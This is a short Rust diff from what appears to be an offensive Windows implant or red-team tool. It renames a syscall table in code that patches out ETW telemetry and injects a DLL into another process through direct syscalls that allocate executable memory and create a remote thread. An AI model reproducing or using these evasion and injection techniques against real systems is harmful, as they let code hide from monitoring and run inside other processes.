@@ -77,8 +77,8 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
             &ret_opcode as *const u8 as *mut c_void,
             size,
             &mut bytes_written as *mut usize,
-            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn,
-            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
+            ZW_SSN[ZwIndex::ZwWriteVirtualMemory as usize].ssn,
+            ZW_SSN[ZwIndex::ZwWriteVirtualMemory as usize].syscall_ret
         )
     };
 
@@ -172,8 +172,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             desired_access, 
             &object_attributes as *const OBJECT_ATTRIBUTES as *mut OBJECT_ATTRIBUTES, 
             &client_id as *const CLIENT_ID as *mut CLIENT_ID, 
-            NT_SSN[NtIndex::ZwOpenProcess as usize].ssn, 
-            NT_SSN[NtIndex::ZwOpenProcess as usize].syscall_ret
+            ZW_SSN[ZwIndex::ZwOpenProcess as usize].ssn, 
+            ZW_SSN[ZwIndex::ZwOpenProcess as usize].syscall_ret
         );
 
         if status != STATUS_SUCCESS {
@@ -191,8 +191,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             &mut region_size as *const usize as *mut usize, 
             (MEM_COMMIT | MEM_RESERVE) as u64, 
             PAGE_EXECUTE_READWRITE as u64, 
-            NT_SSN[NtIndex::ZwAllocateVirtualMemory as usize].ssn, 
-            NT_SSN[NtIndex::ZwAllocateVirtualMemory as usize].syscall_ret
+            ZW_SSN[ZwIndex::ZwAllocateVirtualMemory as usize].ssn, 
+            ZW_SSN[ZwIndex::ZwAllocateVirtualMemory as usize].syscall_ret
         );
 
 
@@ -213,8 +213,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             dll_data.as_ptr() as *const c_void as *mut c_void, 
             dll_data.len(), 
             &mut bytes_written, 
-            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn, 
-            NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
+            ZW_SSN[ZwIndex::ZwWriteVirtualMemory as usize].ssn, 
+            ZW_SSN[ZwIndex::ZwWriteVirtualMemory as usize].syscall_ret
         );
 
         if status != STATUS_SUCCESS || bytes_written != dll_data.len() {
@@ -239,8 +239,8 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             0, 
             0, 
             null_mut(), 
-            NT_SSN[NtIndex::ZwCreateThreadEx as usize].ssn, 
-            NT_SSN[NtIndex::ZwCreateThreadEx as usize].syscall_ret
+            ZW_SSN[ZwIndex::ZwCreateThreadEx as usize].ssn, 
+            ZW_SSN[ZwIndex::ZwCreateThreadEx as usize].syscall_ret
         );
 
 
